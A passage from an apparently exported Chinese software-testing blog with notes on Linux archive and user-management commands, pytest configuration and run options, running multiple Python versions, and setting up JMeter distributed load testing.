    <content><![CDATA[<p>-c表示备份；<br />-r 表示增加文件；<br />-u 表示更新文件；<br />-t 列出文件；<br />-x表示解压；<br />注：这五个是独立的命令，压缩解压都要用到其中一个，可以和别的命令连用但只能用其中一个<br />帮助文档详情：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/25987745/1646752301195-1a5dddd1-d74e-450b-a2f3-9da324f63493.png#averageHue=%23fdfdfd&clientId=ua4455a91-6456-4&from=paste&height=186&id=u718bc84b&originHeight=228&originWidth=579&originalType=binary&ratio=1&rotation=0&showTitle=false&size=21525&status=done&style=none&taskId=u190ea2b2-a6b6-4211-a4e5-2448cb9759c&title=&width=472.5" alt="image.png"><br />-f: 使用档案名字，切记，这个参数是最后一个参数，后面只能接档案名。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/25987745/1646752380651-e898b01e-d4e4-4720-9940-62619a3a3813.png#averageHue=%23fefefe&clientId=ua4455a91-6456-4&from=paste&height=78&id=u3bbfb90d&originHeight=116&originWidth=682&originalType=binary&ratio=1&rotation=0&showTitle=false&size=8375&status=done&style=none&taskId=ua199a1e1-cac4-4f13-acd4-c10b26c74a5&title=&width=456" alt="image.png"><br />-v, –verbose              详细地列出处理的文件<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/25987745/1646752432425-cd4cf943-a3df-4f64-a68f-2cbe1be946c9.png#averageHue=%23fdefee&clientId=ua4455a91-6456-4&from=paste&height=91&id=u87e9e72e&originHeight=125&originWidth=602&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13816&status=done&style=none&taskId=ua798fb6b-b83f-46d5-aefc-10a2eb69d09&title=&width=439" alt="image.png">[</p>
<p>](<a href="https://blog.csdn.net/weixin_42359436/article/details/107949145">https://blog.csdn.net/weixin_42359436/article/details/107949145</a>)<br><a name="xg8AS"></a></p>
<h2 id="1、tar"><a href="#1、tar" class="headerlink" title="1、tar"></a>1、tar</h2><p>使用 tar 程序打出来的包我们常称为 tar 包，tar 包文件的命令通常都是以 .tar 结尾的。生成 tar 包后，就可以用其它的程序来进行压缩<br />**tar -cf  **：压缩<br />**tar -xf  **：解压<br />例：tar -cf test1.tar test1 <br /><img src="https://cdn.nlark.com/yuque/0/2022/png/25987745/1646751976348-f361c2bf-a675-41e5-892f-83efcd0e1718.png#averageHue=%23fdf0ef&clientId=u40ea92a5-a5fa-4&from=paste&height=73&id=u4e25e04c&originHeight=111&originWidth=572&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14915&status=done&style=none&taskId=uc262c46d-0b2a-410b-ac11-22f3f53ee91&title=&width=378" alt="image.png"><br />tar -xf test2.tar<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/25987745/1646752134272-20e5f3d0-578a-4633-ae50-b24c70208fb2.png#averageHue=%23f8f5f5&clientId=ua4455a91-6456-4&from=paste&height=108&id=ud039d410&originHeight=160&originWidth=639&originalType=binary&ratio=1&rotation=0&showTitle=false&size=18050&status=done&style=none&taskId=uea0a8696-1686-4c0c-896f-ddf8c92e4bd&title=&width=431.5" alt="image.png"><br><a name="bbZ3D"></a></p>
<h2 id="2、zip-unzip"><a href="#2、zip-unzip" class="headerlink" title="2、zip&#x2F;unzip"></a>2、zip&#x2F;unzip</h2><p>zip -r test3.zip test3  —-&gt;压缩test3目录生成test3.zip<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/25987745/1646752659560-bc6398a5-acac-4091-8bfe-64ad790ebd09.png#averageHue=%23faf3f3&clientId=ua4455a91-6456-4&from=paste&height=118&id=u0c5d4c09&originHeight=177&originWidth=703&originalType=binary&ratio=1&rotation=0&showTitle=false&size=25001&status=done&style=none&taskId=uafdaf98c-5918-4296-90a6-2d1a45f2a03&title=&width=468.5" alt="image.png"><br />unzip test3.zip  ———&gt;将test3.zip解压生成test3文件夹<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/25987745/1646752749545-42b067b3-393f-4031-a863-f064d62e46ba.png#averageHue=%23fcf7f7&clientId=ua4455a91-6456-4&from=paste&height=149&id=u8936bb85&originHeight=237&originWidth=701&originalType=binary&ratio=1&rotation=0&showTitle=false&size=30448&status=done&style=none&taskId=u6bf380c9-562e-4ca2-a03e-943256e343a&title=&width=441.5" alt="image.png"></p>
<p><a name="CEQ71"></a></p>
<h2 id="3、-tar-gz文件"><a href="#3、-tar-gz文件" class="headerlink" title="3、  .tar.gz文件"></a>3、  .tar.gz文件</h2><p>压缩命令：<br />tar <strong>-zcvf</strong> 压缩文件名 .tar.gz 被压缩文件名<br />解压命令：<br />tar <em><em>-zxvf <strong>压缩文件名.tar.gz<br />#把当前目录下的222.tar.gz解压到ee&#x2F;下，前提要保证存在ee这个目录<br /></strong> tar -zxvf <em><em>222.tar.gz <strong>-C</strong> ee&#x2F;<br />扩展：<br />1、</em>.tar 用 tar –xvf 解压<br />2、</em>.gz 用 gzip -d或者gunzip 解压<br />3、</em>.tar.gz和</em>.tgz 用 tar –xzf 解压<br />4、*.bz2 用 bzip2 -d或者用bunzip2 解压<br />5、*.tar.bz2用tar –xjf 解压<br />6、*.Z 用 uncompress 解压<br />7、*.tar.Z 用tar –xZf 解压<br />8、*.rar 用 unrar e解压<br />9、*.zip 用 unzip 解压<br />10、tar –cvf jpg.tar *.jpg       &#x2F;&#x2F; 将目录里所有jpg文件打包成 tar.jpg<br />11、rar a jpg.rar *.jpg          &#x2F;&#x2F; rar格式的压缩，需要先下载 rar for linux<br />12、zip jpg.zip *.jpg            &#x2F;&#x2F; zip格式的压缩，需要先下载 zip for linux<br />13、tar –xvf file.tar            &#x2F;&#x2F; 解压 tar 包</p>
<p>权限管理<br />改变文件拥有者的权限：chown <br /><img src="https://cdn.nlark.com/yuque/0/2022/png/25987745/1647251448374-e06fb07c-d955-457a-985d-c32f4ad01cfa.png#averageHue=%23faf9f9&clientId=u1132c3e6-7f24-4&from=paste&height=170&id=u01fb01e3&originHeight=340&originWidth=515&originalType=binary&ratio=1&rotation=0&showTitle=false&size=32805&status=done&style=none&taskId=u25179c38-1092-4ec3-af96-9ff157aa652&title=&width=257.5" alt="image.png"><br /><a href="https://blog.csdn.net/weixin_42359436/article/details/107949145"><br /></a>新增用户组：groupadd -g 组名<br />例 groupadd -g 201 iread:增加一个名为iread,用户组id为201的用户组<br />删除用户组：groupdel 组名<br />修改用户组：groupmod -g 10000 -n group3 group2:将组group2的标识号改为10000，组名修改为为group3<br />创建用户：useradd 用户名 <br />例：useradd -g iread -d &#x2F;home&#x2F;wap -s &#x2F;usr&#x2F;bin&#x2F;csh -m wap<br />—》新增一个用户wap、-g表示用户组，归属用户组为iread、-d用户主目录，-s用户使用shell，-m用户名</p>
]]></content>
      <categories>
        <category>软件测试</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>pytest基础</title>
    <url>/2023/09/19/pytest%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<p><a name="NKjZm"></a></p>
<h1 id="注：函数、方法都可以看做是用例"><a href="#注：函数、方法都可以看做是用例" class="headerlink" title="注：函数、方法都可以看做是用例"></a>注：函数、方法都可以看做是用例</h1><p><a name="Tvl9E"></a></p>
<h1 id="一、pytest相关插件"><a href="#一、pytest相关插件" class="headerlink" title="一、pytest相关插件"></a>一、pytest相关插件</h1><p>在项目中新建一个requirements.txt,输入下面的插件，然后命令行输入<strong>pip install -r requirements.txt</strong>即可一次性安装</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pytest</span><br><span class="line">pytest-html</span><br><span class="line">pytest-xdist</span><br><span class="line">pytest-ordering</span><br><span class="line">pytest-rerunfailures</span><br><span class="line">allure-pytest</span><br><span class="line">  </span><br></pre></td></tr></table></figure>
<p>pytest-html—生成html格式的自动化测试报告<br />pytest-xdist—测试用例分布式执行。多CPU分发<br />pytest-ordering—用于改变测试用例的执行顺序<br />pytest-rerunfailures—用例失败后重跑<br />allure-pytest—–生成美观的测试报告<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/25987745/1658319549293-cf5b3f71-eac9-4b8e-9ba2-fb96ce898eb8.png#averageHue=%235e5b33&clientId=u430eaf21-9cf6-4&from=paste&height=246&id=u7f1a3547&originHeight=307&originWidth=524&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24470&status=done&style=none&taskId=u81c7100e-91f1-4113-9292-d42ad54399e&title=&width=419.2" alt="image.png"><br><a name="TpHIF"></a></p>
<h1 id="二、运行方式"><a href="#二、运行方式" class="headerlink" title="二、运行方式"></a>二、运行方式</h1><p><a name="CRpZ4"></a></p>
<h2 id="（1）主函数运行—pytest-main"><a href="#（1）主函数运行—pytest-main" class="headerlink" title="（1）主函数运行—pytest.main()"></a>（1）主函数运行—pytest.main()</h2><p>参数-s：表示 输出调试信息，包括print打印的信息，如果不加-s,print的信息无法输出</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">注：默认执行当前目录中所有以test_开头的用例，即使不在同一个模块文件内</span><br><span class="line"><span class="keyword">if</span> __name__=<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"><span class="comment">#1、不加参数 </span></span><br><span class="line">    pytest.<span class="title function_ invoke__">main</span>()</span><br><span class="line"><span class="comment">#2、加参数</span></span><br><span class="line">    pytest.<span class="title function_ invoke__">main</span>([<span class="string">&#x27;-s&#x27;</span>])</span><br><span class="line"><span class="comment">#3、执行指定用例</span></span><br><span class="line">    pytest.<span class="title function_ invoke__">main</span>([<span class="string">&#x27;文件名.py&#x27;</span>])</span><br><span class="line"><span class="comment">#4、参数+指定用例</span></span><br><span class="line">    pytest.<span class="title function_ invoke__">main</span>([<span class="string">&#x27;-vs&#x27;</span>,<span class="string">&#x27;文件名.py&#x27;</span>])</span><br><span class="line">    <span class="comment">#开多线程 pytest.main([&#x27;-vs&#x27;,&#x27;./testcase&#x27;,&#x27;-n=2&#x27;])，前提是安装了pytest-xdist</span></span><br><span class="line"><span class="comment">#5、执行指定目录下的用例,例如项目根目录下的testcase内的所有用例</span></span><br><span class="line">    pytest.<span class="title function_ invoke__">main</span>([<span class="string">&#x27;-vs&#x27;</span>,<span class="string">&#x27;./testcase&#x27;</span>])</span><br><span class="line"><span class="comment">#6、执行</span></span><br><span class="line">    pytest.<span class="title function_ invoke__">main</span>([<span class="string">&#x27;-vs&#x27;</span>],<span class="string">&#x27;./目录/文件名.py::类名::用例名&#x27;</span>)</span><br><span class="line">    <span class="comment">#执行函数也一样</span></span><br></pre></td></tr></table></figure>
<p>运行：1、运行根目录下的all.py，执行了项目中的所有用例，演示项目中有两个测试用例模块，共3个用例<img src="https://cdn.nlark.com/yuque/0/2022/png/25987745/1658315976679-80053acd-e615-475a-97c9-7290abc31b70.png#averageHue=%23837455&clientId=u430eaf21-9cf6-4&from=paste&height=522&id=uda685f0e&originHeight=653&originWidth=970&originalType=binary&ratio=1&rotation=0&showTitle=false&size=77450&status=done&style=none&taskId=u77580468-2ee1-481c-9b9b-c4fce7a86fa&title=&width=776" alt="image.png"><br><a name="wKtlR"></a></p>
<h2 id="（2）命令行模式"><a href="#（2）命令行模式" class="headerlink" title="（2）命令行模式"></a>（2）命令行模式</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、运行所有：pytest</span><br><span class="line"><span class="number">2</span>、指定模块：pytest -vs 文件名.py</span><br><span class="line"><span class="number">3</span>、指定目录：pytest -vs ./目录名</span><br></pre></td></tr></table></figure>
<p><a name="Lq0uI"></a></p>
<h2 id="3-pytest-ini"><a href="#3-pytest-ini" class="headerlink" title="(3)pytest.ini"></a>(3)pytest.ini</h2><p>pytest.ini是pytest单元测试框架的核心配置文件–文件中不能使用任何中文符号（也可以用，最好少用）</p>
<p>a、位置：一般放项目的根目录<br />b、编码：ANSI，可以使用notepad++修改编码格式<br />c、作用：改变pytest默认行为<br />d、不管是主函数还是命令行运行，都会读取这个配置文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[pytest]</span><br><span class="line">注释符号用分号；</span><br><span class="line">;命令行参数，用空格分隔</span><br><span class="line">addopts = -v -s --reruns 1 --html=report.html</span><br><span class="line">; 读取测试用例的起始文件夹，多个路径用空格分隔。注意：这些目录下不能出现相同文件名，否则会报错</span><br><span class="line">testpaths = ./testcase</span><br><span class="line">; 配置测试搜索的模块文件名称</span><br><span class="line">python_files =  test_*.py</span><br><span class="line">; 配置测试搜索的模块文件名称</span><br><span class="line">python_classes=Test*</span><br><span class="line">python_functions=test</span><br><span class="line"></span><br><span class="line">;标记分组参数</span><br><span class="line">markers=</span><br><span class="line">    smoke:冒烟用例</span><br><span class="line">    usermanage:用户管理模块</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/25987745/1663053901608-f62292e1-ef68-45b5-bc8e-6193d411f59e.png#averageHue=%236a6543&clientId=u97b14d32-0d0d-4&from=paste&height=298&id=u8bd68124&originHeight=298&originWidth=484&originalType=binary&ratio=1&rotation=0&showTitle=false&size=38712&status=done&style=none&taskId=ue34c6879-2282-416f-8342-fc5fa2719a6&title=&width=484" alt="image.png"><br><a name="ULq7Q"></a></p>
<h1 id="二、参数详解："><a href="#二、参数详解：" class="headerlink" title="二、参数详解："></a>二、参数详解：</h1><p><strong>-s</strong>:显示输出调试信息，包括print打印的信息<br /><strong>-v</strong>:显示理详细的信息<br /><strong>-n</strong>：支持多线程或者分布式运行测试用例。<br />如pytest -vs .&#x2F;testcase&#x2F;test.py -n 2  ——&gt;这一行就是开了两个线程用来执行testcase&#x2F;test.py内的所有用例，如果仅一个线程执行3个用例需要9秒，那么用两个线程来执行大约用6秒（即一个线程跑3次，两个线程只跑2次）<br /><strong>–reruns num</strong>:失败用例重跑(需安装pytest插件)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#当用例执行失败，再重新多跑2次</span></span><br><span class="line"><span class="number">1</span>、main方式</span><br><span class="line">  pytest.<span class="title function_ invoke__">main</span>([<span class="string">&#x27;-vs&#x27;</span>,<span class="string">&#x27;./testcase&#x27;</span>,<span class="string">&#x27;--reruns=2&#x27;</span>])     </span><br><span class="line"><span class="number">2</span>、命令行</span><br><span class="line">  pytest -vs ./testcase --reruns <span class="number">2</span></span><br></pre></td></tr></table></figure>
<p><strong>-x</strong>:只要一个用例报错，测试停止<br />**–maxfail&#x3D;2 **:出现两个用例失败则停止</p>
<p>三、用例执行顺序 <br />1、默认用例从上到下执行<br />2、改变顺序<br />第一种–使用mark标记：@pytest.mark.run(order&#x3D;num)<br />第二种–使用pytest.ini<br />a、pytest.ini中设置分组<br />b、用例前加上@pytest.mark.分组名<br />c、执行pytest -v -m “smoke”<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/25987745/1658322989916-1a8670ed-4605-4de2-9aee-802e55418dfe.png#averageHue=%237f6f4b&clientId=u430eaf21-9cf6-4&from=paste&height=682&id=u8114949d&originHeight=853&originWidth=1472&originalType=binary&ratio=1&rotation=0&showTitle=false&size=164304&status=done&style=none&taskId=uda2ea360-e600-423b-94c3-6ca21c6dc0f&title=&width=1177.6" alt="image.png"></p>
]]></content>
      <categories>
        <category>自动化测试</category>
      </categories>
      <tags>
        <tag>pytest</tag>
      </tags>
  </entry>
  <entry>
    <title>python多版本共存</title>
    <url>/2023/04/28/python%E5%A4%9A%E7%89%88%E6%9C%AC%E5%85%B1%E5%AD%98/</url>
    <content><![CDATA[<p>1、将不同版本放在不同的目录下<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/25987745/1658296439642-ed40f721-b46f-485f-b911-95587d908c55.png#averageHue=%23fbfbfa&clientId=u8ad53844-af4d-4&from=paste&height=256&id=u1a009db5&originHeight=320&originWidth=810&originalType=binary&ratio=1&rotation=0&showTitle=false&size=23440&status=done&style=none&taskId=ucd9ac5a2-00fd-4eea-a42f-828a91bf32b&title=&width=648" alt="image.png"><br />2、复制python.exe并重命名<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/25987745/1658296534075-1dec37ee-3d96-4fe6-abfd-d169a3f52467.png#averageHue=%23fbfaf9&clientId=u8ad53844-af4d-4&from=paste&height=459&id=uc3c1e253&originHeight=574&originWidth=749&originalType=binary&ratio=1&rotation=0&showTitle=false&size=40977&status=done&style=none&taskId=u07bb7b03-e5d7-43d9-ba81-b16bbd2bfe9&title=&width=599.2" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2022/png/25987745/1658296555137-ffbbe867-0b35-4034-a3a4-7d6a12f40221.png#averageHue=%23f9f8f7&clientId=u8ad53844-af4d-4&from=paste&height=472&id=u88ba154d&originHeight=590&originWidth=648&originalType=binary&ratio=1&rotation=0&showTitle=false&size=45513&status=done&style=none&taskId=ubf598a6a-d54f-4098-9be3-994924464ba&title=&width=518.4" alt="image.png"><br />3、环境变量要把两个版本路径都放进去（哪个版本在前，cmd输入python，执行的就是最靠前的那个python版本，pip安装包也同理）<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/25987745/1658296670978-47ae0bc4-8d59-4f2a-86cc-6a6c1b628226.png#averageHue=%23f3f1ef&clientId=u8ad53844-af4d-4&from=paste&height=523&id=u00d6473a&originHeight=654&originWidth=702&originalType=binary&ratio=1&rotation=0&showTitle=false&size=62639&status=done&style=none&taskId=ud904b188-4745-4a49-b33c-984dde99037&title=&width=561.6" alt="image.png"><br />4、验证<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/25987745/1658296841623-85656b33-613f-4772-a6ab-029e30356760.png#averageHue=%23110f0e&clientId=u8ad53844-af4d-4&from=paste&height=286&id=u922eb459&originHeight=358&originWidth=1041&originalType=binary&ratio=1&rotation=0&showTitle=false&size=46186&status=done&style=none&taskId=ud5234b2e-45ed-42db-8cb0-e8f767b402b&title=&width=832.8" alt="image.png"></p>
<p>指定python版本安装库，使用python -m pip install xxx<br />如：在python36下安装requests</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python36 -m pip install requests</span><br><span class="line"></span><br><span class="line">#查看某版本安装了哪些库</span><br><span class="line">python36 -m pip list</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>自动化测试</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>分布式压测</title>
    <url>/2023/05/28/%E5%88%86%E5%B8%83%E5%BC%8F%E5%8E%8B%E6%B5%8B/</url>
    <content><![CDATA[<p><a name="QDv2O"></a></p>
<h3 id=""><a href="#" class="headerlink" title=""></a><img src="https://cdn.nlark.com/yuque/0/2023/png/25987745/1677123145300-ab812bee-37cd-4f06-9597-8c8259daf0e8.png#averageHue=%23fefefe&clientId=udd754d22-00eb-4&from=paste&id=u2a89d86c&originHeight=608&originWidth=692&originalType=url&ratio=1&rotation=0&showTitle=false&size=116407&status=done&style=none&taskId=u2cb61d68-3f4f-450b-95bb-f38235850ac&title=" alt="image.png"></h3><p><a name="IbMjM"></a></p>
<h2 id="准备工作："><a href="#准备工作：" class="headerlink" title="准备工作："></a>准备工作：</h2><p>1、主从机在同一局域网，且保证能相互ping通<br />2、主从机安装相同版本的JDK、Jmeter<br />3、关闭防火墙（service iptables stop）<br />4、保证电脑运行的只有一个网卡（ipconfig只显示一个ip信息），如果多网卡需要指定网卡通讯。<br><a name="qb39S"></a></p>
<h2 id="jmeter-bin下的文件说明"><a href="#jmeter-bin下的文件说明" class="headerlink" title="jmeter&#x2F;bin下的文件说明"></a>jmeter&#x2F;bin下的文件说明</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># bin:是核心可执行文件，目录下常用文件配置有：</span><br><span class="line">	 jmeter.bat: windows启动文件：</span><br><span class="line">	 jmeter: mac或者linux启动文件：</span><br><span class="line">	 jmeter-server：mac或者Liunx分布式压测使用的启动文件</span><br><span class="line">	 jmeter-server.bat：mac或者Liunx分布式压测使用的启动文件</span><br><span class="line">	 jmeter.properties: 核心配置文件</span><br><span class="line">	 examples：压测脚本文件JMX和动态读取csv参数文件案例</span><br><span class="line">	 result—template:可视化HTML</span><br><span class="line">	 template:JMX的模板文件</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><a name="qhsQg"></a></p>
<h3 id="一、修改配置"><a href="#一、修改配置" class="headerlink" title="一、修改配置"></a>一、修改配置</h3><p><a name="A9x58"></a></p>
<h4 id="1）主控机"><a href="#1）主控机" class="headerlink" title="1）主控机"></a>1）主控机</h4><p>主控机下修改bin目录下的jmeter.properties,找到remote_hosts,<br />修改内容为：remote_hosts&#x3D;xx，xx代表的是压力机的ip。如果是多个压力机，之间使用【，】分隔。<br /> <img src="https://cdn.nlark.com/yuque/0/2023/png/25987745/1677123723043-8bebf3cc-f09e-4221-9cab-447a4c7d089e.png#averageHue=%23eeedeb&clientId=udd754d22-00eb-4&from=paste&height=719&id=u768dcb90&originHeight=719&originWidth=694&originalType=binary&ratio=1&rotation=0&showTitle=false&size=74109&status=done&style=none&taskId=u165df6b4-1576-4411-91d3-71db317d00f&title=&width=694" alt="image.png"><br><a name="zQudZ"></a></p>
<h4 id="2）执行机"><a href="#2）执行机" class="headerlink" title="2）执行机"></a>2）执行机</h4><p>同样修改jmeter.properties，查询slave的本机IP并填入，根据实际修改端口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">remote_hosts=<span class="number">192.168</span><span class="number">.1</span><span class="number">.145</span>:<span class="number">1099</span>  #本机IP</span><br><span class="line"> </span><br><span class="line">server_port=<span class="number">1099</span></span><br><span class="line"> </span><br><span class="line">server.rmi.localport=<span class="number">1099</span></span><br></pre></td></tr></table></figure>
<p><a name="eJT5x"></a></p>
<h3 id="二、启动执行机服务"><a href="#二、启动执行机服务" class="headerlink" title="二、启动执行机服务"></a>二、启动执行机服务</h3><p>1）slave为window:<br />直接运行执行机jmeter bin目录下的jmeter-server.bat<br />2）slave为Linux:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 进入bin/jmeter-server</span></span><br><span class="line">./jmetr-server</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看是否开启成功</span></span><br><span class="line">ps -ef | grep jmeter-server</span><br></pre></td></tr></table></figure>
<p><em>若报错提示要加密，采用如下两种方式解决</em><br /><em>方式一：设置SSL。如图所示，双击create-rmi-keystore.bat（根据提示一直填下去，遇到yes与No就直接填:Y 然后回车就ok了，要注意：生成的rmi_keystore.jks复制到每一台压力机的jmeter&#x2F;bin目录下）</em><br /><img src="https://cdn.nlark.com/yuque/0/2023/png/25987745/1677124018065-f94c54ee-7a1c-4b9e-b635-cf5130769a1c.png#averageHue=%23fdfcfb&clientId=udd754d22-00eb-4&from=paste&height=206&id=ub07aa9c7&originHeight=339&originWidth=501&originalType=url&ratio=1&rotation=0&showTitle=false&size=74760&status=done&style=none&taskId=ufa72eb08-9e84-4e43-92cc-9319636107b&title=&width=305" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2023/png/25987745/1677124060692-d085f53a-1f91-4866-9bf2-524e30da7214.png#averageHue=%23fbf9f8&clientId=udd754d22-00eb-4&from=paste&id=u0ccebf3d&originHeight=358&originWidth=262&originalType=url&ratio=1&rotation=0&showTitle=false&size=70419&status=done&style=none&taskId=u584eb14d-4eca-473c-b065-5bd5b94ac50&title=" alt="image.png"><br /><em>方式二：修改控制机和压力机bin目录下jmeter.properties文件中server.rmi.ssl.disable&#x3D;true 禁用SSL</em><br /><img src="https://cdn.nlark.com/yuque/0/2023/png/25987745/1677124114552-350e273d-5794-498d-9fc8-20c1cdb6c101.png#averageHue=%23fbfbfb&clientId=udd754d22-00eb-4&from=paste&id=u5eaa795c&originHeight=658&originWidth=637&originalType=url&ratio=1&rotation=0&showTitle=false&size=259189&status=done&style=none&taskId=u7d8e89a4-f723-4b56-9e8c-e9477051b4e&title=" alt="image.png"><br><a name="HggLv"></a></p>
<h3 id="三、启动主控机服务"><a href="#三、启动主控机服务" class="headerlink" title="三、启动主控机服务"></a>三、启动主控机服务</h3><p>先启动jmeter-server.bat,再启动jmeter.bat<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/25987745/1669887875269-343575cb-d266-4f2c-b1f3-01d5deac0a82.png#averageHue=%23f6f4f2&clientId=ud3cb15e7-1245-4&from=paste&height=595&id=PSVNW&originHeight=595&originWidth=538&originalType=binary&ratio=1&rotation=0&showTitle=false&size=70767&status=done&style=none&taskId=u23c6ede9-4a4a-4d42-aeb6-57d52bb6c08&title=&width=538" alt="image.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">netstat -ano |findstr <span class="string">&quot;1099&quot;</span>  #查看端口是否已开启</span><br></pre></td></tr></table></figure>
<p><a name="cimYG"></a></p>
<h3 id="四、运行（确保第2步的压力机都已启动jmeter-server-bat）"><a href="#四、运行（确保第2步的压力机都已启动jmeter-server-bat）" class="headerlink" title="四、运行（确保第2步的压力机都已启动jmeter-server.bat）"></a>四、运行（确保第2步的压力机都已启动jmeter-server.bat）</h3><p><img src="https://cdn.nlark.com/yuque/0/2023/png/25987745/1677117445684-a825993c-90ee-47da-9837-3bd9b1aa96dc.png#averageHue=%233d4042&clientId=udd754d22-00eb-4&from=paste&height=825&id=ub1bde3e0&originHeight=825&originWidth=1023&originalType=binary&ratio=1&rotation=0&showTitle=false&size=58867&status=done&style=none&taskId=u09f1ad7d-43ad-4636-be54-8d7eb41e3e5&title=&width=1023" alt="image.png"><br />出现如下说明数据接收成功<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/25987745/1677132641477-550ccb9b-98bd-48ae-a8fc-6d40e282b491.png#averageHue=%23797a78&clientId=udd754d22-00eb-4&from=paste&id=u15ab63b5&originHeight=730&originWidth=1392&originalType=url&ratio=1&rotation=0&showTitle=false&size=433384&status=done&style=none&taskId=u2751e822-ee2a-4f9e-9b73-ca4f41100df&title=" alt="image.png"></p>
<h2 id="命令行启动（win）"><a href="#命令行启动（win）" class="headerlink" title="命令行启动（win）"></a>命令行启动（win）<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">jmeter -n -t xxx.jmx -r -l results.jtl -e -o /path</span><br><span class="line"></span><br><span class="line">n：以非GUI形式运行Jmeter</span><br><span class="line">t：表示要运行的jmx脚本路径</span><br><span class="line">l：result.jtl 运行结果保存路径（.jtl）,此文件必须不存在</span><br><span class="line">r：指远程将所有agent启动</span><br><span class="line">e：在脚本运行结束后生成html报告</span><br><span class="line">o：用于存放html报告的目录</span><br></pre></td></tr></table></figure></h2><p><a name="RCeBD"></a></p>
<h2 id="其他说明："><a href="#其他说明：" class="headerlink" title="其他说明："></a>其他说明：</h2><p>1、jmeter分布式测试中master机的测试结果响应数据为空，原因是：<br />分布式测试中，通过远程启动代理服务器，注重的而是高并发，默认查看结果树中的响应数据为空，只有错误信息会被报回。<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/25987745/1677132723901-17106943-8f40-433d-9a39-c00e868658a1.png#averageHue=%233f4346&clientId=udd754d22-00eb-4&from=paste&id=u2ed9ea4e&originHeight=1680&originWidth=2688&originalType=url&ratio=1&rotation=0&showTitle=false&size=283424&status=done&style=none&taskId=ua9ba1c36-ca7d-440b-b638-ae52b6bd6ac&title=" alt="image.png"><br />如果想要结果返回，直接把bin\jmeter.properties文件中的 mode&#x3D;Standard 之前的 # 号去掉，重启jmeter即可<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/25987745/1677132740238-7754d6ae-0021-4bdc-a2ac-fde659966e21.png#averageHue=%23211f1e&clientId=udd754d22-00eb-4&from=paste&id=ubac2a150&originHeight=568&originWidth=1104&originalType=url&ratio=1&rotation=0&showTitle=false&size=126168&status=done&style=none&taskId=ucfdf1ebf-b5e9-4c0d-b691-99ca9c72044&title=" alt="image.png"><br />———————————-<br><a name="psljw"></a></p>
<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>Q1、在slave上（linux系统）运行jmeter-server时，出现“An error occurred: Cannot start. localhost is a loopback address”错误<br />A1、</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">方式一 输入如下命令</span><br><span class="line">./jmeter-server  -Djava.rmi.server.hostname=<span class="number">192.168</span><span class="number">.20</span><span class="number">.129</span>(本机ip)</span><br><span class="line"></span><br><span class="line">方式二 修改jmeter-server文件</span><br><span class="line">vi jmeter-server 将jmeter-server中的RMI_HOST_DEF=-Djava.rmi.server.hostname=<span class="number">192.16</span>..（本机ip）</span><br><span class="line"></span><br><span class="line">运行./jmeter-server即可</span><br><span class="line"></span><br><span class="line">备注：Linux下后台执行，启用server：nohup ./jmeter-server -Djava.rmi.server.hostname=<span class="number">192.16</span>.. &amp;</span><br><span class="line"></span><br><span class="line">查看确定jmeter是否启动成功：ps axu | grep jmeter</span><br></pre></td></tr></table></figure>


<p>参考链接<br />1、<a href="https://www.cnblogs.com/cjw996/articles/16088641.html">https://www.cnblogs.com/cjw996/articles/16088641.html</a><br />2、<a 